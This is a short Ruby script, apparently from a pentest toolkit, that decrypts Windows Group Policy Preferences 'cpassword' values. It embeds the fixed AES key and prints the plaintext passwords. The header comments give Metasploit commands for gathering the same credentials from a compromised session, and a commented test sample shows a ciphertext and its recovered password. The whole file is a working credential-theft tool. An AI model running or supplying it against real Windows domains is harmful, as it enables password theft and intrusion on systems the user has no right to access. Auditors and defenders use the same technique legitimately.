#!/usr/bin/ruby
# 其他方案
# use post/windows/gather/credentials/gpp
# set session 1
# exploit -j
#
# http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html

require 'rubygems'
require 'openssl'
require 'base64'

def decrypt(encrypted_data)
    padding = "=" * (4 - (encrypted_data.length % 4))
    epassword = "#{encrypted_data}#{padding}"
    decoded = Base64.decode64(epassword)

    key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
    aes.decrypt
    aes.key = key
    plaintext = aes.update(decoded)
    plaintext << aes.final
    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

    return pass
end

ARGV.each do |a|
    b = decrypt (a)
    print sprintf "%s: %s\n", a, b
end

# 测试数据
# encrypted_data = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
# Local*P4ssword!
# print decrypt(encrypted_data)
